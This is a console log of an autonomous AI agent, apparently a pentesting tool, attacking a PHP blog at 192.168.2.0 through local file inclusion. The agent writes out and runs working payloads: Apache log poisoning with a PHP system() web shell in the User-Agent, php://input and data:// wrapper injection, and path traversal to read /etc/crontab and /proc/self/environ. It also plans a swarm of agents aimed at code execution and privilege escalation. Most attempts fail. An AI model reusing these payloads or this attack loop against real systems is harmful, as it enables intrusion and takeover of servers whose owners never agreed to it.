+[95m│[0m  [2m```[0m
+[95m│[0m  [2m#### 13.2: Include the Log File[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/log/apache2/access.log&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis should execute the `id` command if successful.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 16/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Executing 2 commands (sequential):
+                                    1. [92mcurl -A "<?php system(\\_GET['cmd']); ?>" "http://192.168.2.0"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../var/log/apache2/access.log&cmd=id"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+            </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        <br />
+<b>Warning</b>:  include(/dev/pts/0): failed to open stream: No such file or directory in <b>/var/www/html/includes/route.php</b> on line <b>10</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '../../../../var/log/apache2/access.log' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/includes/route.php</b> on line <b>10</b><br />
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The log poisoning attempt continues to fail because:[0m
+[95m│[0m  [2m- The log file `/var/log/apache2/access.log` does not exist or is not accessible.[0m
+[95m│[0m  [2m- The error `include(/dev/pts/0)` suggests that the `page` parameter is being processed in a way that may involve shell interaction or redirection, but the path is not resolving correctly.[0m
+[95m│[0m  [2m### Hypothesis:[0m
+[95m│[0m  [2m- The web server may not be Apache but another service (e.g., PHP's built-in server), which does not log to `/var/log/apache2/access.log`.[0m
+[95m│[0m  [2m- The PHP cli server logs to `stdout` or `/dev/pts/0`, which is not writable.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Check for PHP's built-in server logs** (e.g., `/dev/pts/0` or `/proc/self/fd/1`).[0m
+[95m│[0m  [2m2. **Attempt RCE via `php://input`** if log poisoning is not feasible.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 14: Attempt RCE via `php://input`[0m
+[95m│[0m  [2mI will use `php://input` to inject PHP code via POST data:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -X POST --data "<?php system(\$_GET['cmd']); ?>" "http://192.168.2.0/index.php?page=php://input" --get -d "" -G -d "cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will send the PHP payload via POST and execute the `id` command.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 17/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl -X POST --data "<?php system(\\_GET['cmd']); ?>" "http://192.168.2.0/index.php?page=php://input" --get -d "" -G -d "cmd=id"[0m
+
+curl: (3) URL rejected: Malformed input to a URL function
+[91mError:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `curl` command failed due to malformed syntax.[0m
+[95m│[0m  [2m- The correct syntax for sending POST data and GET parameters simultaneously is:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -X POST --data "<?php system(\$_GET['cmd']); ?>" "http://192.168.2.0/index.php?page=php://input&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m### Corrected Command:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -X POST --data "<?php system(\$_GET['cmd']); ?>" "http://192.168.2.0/index.php?page=php://input&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 18/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl -X POST --data "<?php system(\\_GET['cmd']); ?>" "http://192.168.2.0/index.php?page=php://input&cmd=id"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `php://input` attempt returned "Page not found," indicating that the `php://input` wrapper is not being processed as expected.[0m
+[95m│[0m  [2m- This suggests that the `page` parameter is not directly included but may be sanitized or processed in a way that blocks PHP wrappers.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Attempt to use `data://` wrapper** for RCE.[0m
+[95m│[0m  [2m2. **Check for alternative exploitation methods** (e.g., session file inclusion, upload vulnerabilities).[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 15: Attempt RCE via `data://` Wrapper[0m
+[95m│[0m  [2mI will use the `data://` wrapper to inject PHP code:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=data://text/plain,<?php system(\$_GET['cmd']); ?>&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will execute the `id` command if successful.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 19/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=data://text/plain,<?php system(\\_GET['cmd']); ?>&cmd=id"[0m
+
+curl: (3) bad range specification in URL position 72:
+http://192.168.2.0/index.php?page=data://text/plain,<?php system(\_GET['cmd']); ?>&cmd=id
+                                                                       ^
+[91mhttp://192.168.2.0/index.php?page=data://text/plain,<?php system(\_GET['cmd']); ?>&cmd=id
+                                                                       ^
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `curl` command failed due to improper URL encoding.[0m
+[95m│[0m  [2m- The `data://` wrapper contains special characters (e.g., `?`, `&`, `<`, `>`) that must be URL-encoded.[0m
+[95m│[0m  [2m### Corrected Command:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis encodes the PHP payload as:[0m
+[95m│[0m  [2m- `<` → `%3C`[0m
+[95m│[0m  [2m- `?` → `%3F`[0m
+[95m│[0m  [2m- `>` → `%3E`[0m
+[95m│[0m  [2m- ` ` → `%20`[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 20/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E&cmd=id"[0m
+
+curl: (3) bad range specification in URL position 80:
+http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E&cmd=id
+                                                                               ^
+[91mhttp://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E&cmd=id
+                                                                               ^
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The URL encoding issue persists due to the `&` character, which separates query parameters.[0m
+[95m│[0m  [2m- The `&cmd=id` must be passed as a separate argument or encoded as `%26`.[0m
+[95m│[0m  [2m### Corrected Command:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E%26cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis encodes the entire payload, including the `&` as `%26`.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 21/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E%26cmd=id"[0m
+
+curl: (3) bad range specification in URL position 80:
+http://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E%26cmd=id
+                                                                               ^
+[91mhttp://192.168.2.0/index.php?page=data://text/plain,%3C%3Fphp%20system(%24_GET['cmd']);%20%3F%3E%26cmd=id
+                                                                               ^
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `curl` command continues to fail due to the complexity of the URL.[0m
+[95m│[0m  [2m- **Alternative Approach:** Use a tool like `python3` or `burpsuite` to craft the request properly, or split the command into two parts:[0m
+[95m│[0m  [2m1. Inject the payload via `data://`.[0m
+[95m│[0m  [2m2. Pass the `cmd` parameter separately.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Use Python to send the request** with proper encoding.[0m
+[95m│[0m  [2m2. **Store the current findings** and reassess the strategy.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Storing Findings[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 22/100: [96mmem0_memory[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Storing [[96mfinding[0m]: [2mRemote Code Execution (RCE) attempts via LFI and PHP wrappers (php://input, data://) were unsuccessful. The target's inclusion logic sanitizes or bloc...[0m
+                          Metadata: [2m{'category': 'finding', 'severity': 'high', 'confidence': '90%'}[0m
+
+[32m╭─[0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m [0m[1;32mMemory Stored[0m[32m [0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m─╮[0m
+[32m│[0m [3m                          Memory Stored                           [0m                                                                                                                        [32m│[0m
+[32m│[0m ┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                                                                        [32m│[0m
+[32m│[0m ┃[1;35m [0m[1;35mOperation[0m[1;35m [0m┃[1;35m [0m[1;35mContent                                           [0m[1;35m [0m┃                                                                                                                        [32m│[0m
+[32m│[0m ┡━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩                                                                                                                        [32m│[0m
+[32m│[0m │[32m [0m[32mADD      [0m[32m [0m│[33m [0m[33mRemote Code Execution (RCE) attempts via LFI and  [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33mPHP wrappers (php://input, data://) were          [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33munsuccessf...                                     [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m └───────────┴────────────────────────────────────────────────────┘                                                                                                                        [32m│[0m
+[32m╰───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯[0m
+[
+  {
+    "id": "1fc8ece4-182c-4a4b-81fa-ea16ae018a58",
+    "memory": "Remote Code Execution (RCE) attempts via LFI and PHP wrappers (php://input, data://) were unsuccessful. The target's inclusion logic sanitizes or blocks these methods. However, LFI is confirmed, and the server is vulnerable to arbitrary file read. Next steps: Explore alternative RCE vectors (e.g., session files, uploads) or pivot to other attack surfaces.",
+    "event": "ADD",
+    "actor_id": null,
+    "role": "user"
+  }
+]
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Plan Update:[0m
+[95m│[0m  [2m- **Goal:** Achieve RCE via alternative methods.[0m
+[95m│[0m  [2m- **Steps:**[0m
+[95m│[0m  [2m1. **Check for session file inclusion** (e.g., `/var/lib/php/sessions/`).[0m
+[95m│[0m  [2m2. **Enumerate upload functionalities** (e.g., file upload forms).[0m
+[95m│[0m  [2m3. **Use `swarm` to parallelize exploration** of other attack surfaces.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 16: Check for Session File Inclusion[0m
+[95m│[0m  [2mI will attempt to include a PHP session file, which may allow code execution if writable:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/lib/php/sessions/sess_*"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mIf successful, this could reveal session files that can be poisoned for RCE.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 23/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../var/lib/php/sessions/sess_*"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The session file inclusion attempt failed, likely because:[0m
+[95m│[0m  [2m- The session directory does not exist or is not accessible.[0m
+[95m│[0m  [2m- The wildcard (`*`) is not resolved by the inclusion logic.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Deploy a `swarm`** to parallelize exploration of other attack surfaces (e.g., upload forms, alternative LFI paths).[0m
+[95m│[0m  [2m2. **Focus on achieving RCE** via other vectors or pivot to post-exploitation if possible.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 17: Deploy Swarm for Parallel Exploration[0m
+[95m│[0m  [2mI will deploy a `swarm` of 3 agents to:[0m
+[95m│[0m  [2m1. **Agent 1:** Enumerate upload functionalities.[0m
+[95m│[0m  [2m2. **Agent 2:** Explore alternative LFI paths (e.g., `/proc/self/environ`).[0m
+[95m│[0m  [2m3. **Agent 3:** Check for misconfigured services or backups.[0m
+[95m│[0m  [2m#### Swarm Task:[0m
+[95m│[0m  [2m```python[0m
+[95m│[0m  [2mswarm([0m
+[95m│[0m  [2mtask="""[0m
+[95m│[0m  [2mFIRST ACTION: mem0_memory(action="list", user_id="vulcan_agent")[0m
+[95m│[0m  [2mCONTEXT: LFI confirmed on 192.168.2.0 via 'page' parameter. RCE attempts via log poisoning and PHP wrappers failed.[0m
+[95m│[0m  [2mOBJECTIVE: Achieve RCE or escalate privileges via alternative methods.[0m
+[95m│[0m  [2mAVOID: Repeating LFI/log poisoning attempts.[0m
+[95m│[0m  [2mFOCUS:[0m
+[95m│[0m  [2m- Agent 1: Enumerate upload forms or file write vulnerabilities.[0m
+[95m│[0m  [2m- Agent 2: Explore /proc/self/environ, /proc/self/fd/, or other LFI paths for RCE.[0m
+[95m│[0m  [2m- Agent 3: Check for misconfigured services, backups, or sensitive files (e.g., /etc/crontab, /var/backups).[0m
+[95m│[0m  [2mSUCCESS: RCE, privilege escalation, or new attack surface discovery.[0m
+[95m│[0m  [2m""",[0m
+[95m│[0m  [2mswarm_size=3,[0m
+[95m│[0m  [2mcoordination_pattern="collaborative",[0m
+[95m│[0m  [2mmodel_provider="mistral",[0m
+[95m│[0m  [2mmodel_settings={"model_id": "mistral-large-latest", "max_tokens": 2000, "temperature": 0.7},[0m
+[95m│[0m  [2mtools=["shell", "editor", "load_tool", "http_request", "mem0_memory"][0m
+[95m│[0m  [2m)[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 24/100: [96mswarm[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ [1mOrchestrating Swarm Intelligence[0m
+  Task: [93mFIRST ACTION: mem0_memory(action="list", user_id="vulcan_agent")
+CONTEXT: LFI confirmed on 192.168.2.0 via 'page' parameter. RCE attempts via log poisoning and PHP wrappers failed.
+OBJECTIVE: Achieve ...[0m
+  [1mConfiguration:[0m
+    Agents: [96m1[0m
+    Pattern: [95mcollaborative[0m
+
+ERROR:strands.tools.registry:tool_name=<shell> | failed to load tool
+Traceback (most recent call last):
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/tools/registry.py", line 128, in load_tool_from_filepath
+    raise FileNotFoundError(f"Tool file not found: {tool_path}")
+FileNotFoundError: Tool file not found: shell
+ERROR:strands_tools.swarm:Custom swarm execution failed: Failed to load tool shell: Tool file not found: shell
+Traceback (most recent call last):
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/tools/registry.py", line 128, in load_tool_from_filepath
+    raise FileNotFoundError(f"Tool file not found: {tool_path}")
+FileNotFoundError: Tool file not found: shell
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands_tools/swarm.py", line 406, in swarm
+    swarm_agents = _create_custom_agents(
+                   ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands_tools/swarm.py", line 201, in _create_custom_agents
+    swarm_agent = Agent(
+                  ^^^^^^
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/agent/agent.py", line 290, in __init__
+    self.tool_registry.process_tools(tools)
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/tools/registry.py", line 108, in process_tools
+    add_tool(a_tool)
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/tools/registry.py", line 62, in add_tool
+    self.load_tool_from_filepath(tool_name=tool_name, tool_path=tool)
+  File "/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/strands/tools/registry.py", line 138, in load_tool_from_filepath
+    raise ValueError(f"Failed to load tool {tool_name}: {exception_str}") from e
+ValueError: Failed to load tool shell: Tool file not found: shell
+
+[91mError: ⚠️ Custom swarm execution failed: Failed to load tool shell: Tool file not found: shell[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `swarm` deployment failed due to a tool loading issue.[0m
+[95m│[0m  [2m- **Alternative Approach:** Manually execute the tasks in parallel using `shell` commands.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 18: Manual Parallel Exploration[0m
+[95m│[0m  [2mI will run the following commands in parallel to cover all objectives:[0m
+[95m│[0m  [2m1. **Enumerate upload forms:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mgobuster dir -u http://192.168.2.0 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 20 | grep -i "upload"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m2. **Explore `/proc/self/environ` for RCE:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m3. **Check `/etc/crontab` for misconfigurations:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../etc/crontab"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 25/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+[93m[NOTICE] User disabled parallel execution. Running commands sequentially.[0m
+
+↳ Executing 3 commands (sequential):
+                                    1. [92mgobuster dir -u http://192.168.2.0 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 20 | grep -i "upload"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ"[0m
+                                    3. [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/crontab"[0m
+
+Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.0/51c2f485-6d7c-4913-abd1-05478a817157 => 200 (Length: 872). To continue please exclude the status code or the length
+[91mError:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `gobuster` command failed again due to the server returning HTTP 200 for non-existent URLs.[0m
+[95m│[0m  [2m- **Alternative Approach:** Use `curl` to manually check common upload paths (e.g., `/upload`, `/uploads`, `/upload.php`).[0m
+[95m│[0m  [2m### Corrected Commands:[0m
+[95m│[0m  [2m1. **Check for upload paths:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -I "http://192.168.2.0/upload"[0m
+[95m│[0m  [2mcurl -I "http://192.168.2.0/uploads"[0m
+[95m│[0m  [2mcurl -I "http://192.168.2.0/upload.php"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m2. **Explore `/proc/self/environ`:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m3. **Check `/etc/crontab`:**[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../etc/crontab"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 26/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+[93m[NOTICE] User disabled parallel execution. Running commands sequentially.[0m
+
+↳ Executing 5 commands (sequential):
+                                    1. [92mcurl -I "http://192.168.2.0/upload"[0m
+                                    2. [92mcurl -I "http://192.168.2.0/uploads"[0m
+                                    3. [92mcurl -I "http://192.168.2.0/upload.php"[0m
+                                    4. [92mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ"[0m
+                                    5. [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/crontab"[0m
+
+HTTP/1.1 200 OK
+[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:25 GMT
+[1mConnection[0m: close
+[1mX-Powered-By[0m: PHP/7.4.33
+[1mContent-type[0m: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:26 GMT
+[1mConnection[0m: close
+[1mX-Powered-By[0m: PHP/7.4.33
+[1mContent-type[0m: text/html; charset=UTF-8
+
+HTTP/1.1 404 Not Found
+[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:26 GMT
+[1mConnection[0m: close
+[1mContent-Type[0m: text/html; charset=UTF-8
+[1mContent-Length[0m: 543
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
